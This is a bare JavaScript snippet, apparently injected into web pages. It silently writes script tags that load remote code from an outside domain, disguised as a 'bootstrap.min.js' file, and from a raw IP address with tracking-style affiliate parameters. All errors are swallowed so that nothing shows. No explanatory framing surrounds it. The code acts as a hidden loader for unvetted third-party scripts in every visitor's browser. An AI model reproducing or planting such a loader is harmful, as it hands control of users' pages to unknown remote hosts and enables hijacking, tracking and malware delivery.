(function () {
    try {
        var ab = "http://tool.uixsj.cn/s/js/bootstrap.min.js"
            , d = document;
        _add = function (s, b) {
            if (window.document.readyState == 'loading') {
                d.write('<script type="text/javascript" src="' + s + '" ' + (b === true ? 'async' : '') + '></script>');
            } else {
                var k = d.createElement("script");
                k.type = "text/javascript";
                k.src = s;
                k.async = b;
                var s = d.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(k, s)
            }
        }
            ;
        ab.indexOf("?") > 0 ? ab += "&tcdsp" : ab += "?tcdsp";
        if (!window.self.tmp_jquery && !(!-[1,] && !window.XMLHttpRequest)) {
            window.self.tmp_jquery = 1;
            _add('http://47.93.5.220/kaca_js/js/backEn.js?sm=wm205232&cm=1019051j&cp=94297029_hao_pg&cs=bid%3dsogou-appi-f52b43f6e0e44451&a=ttest_zz', true);
        }
        _add(ab, false);
    } catch (e) { }
}
)();
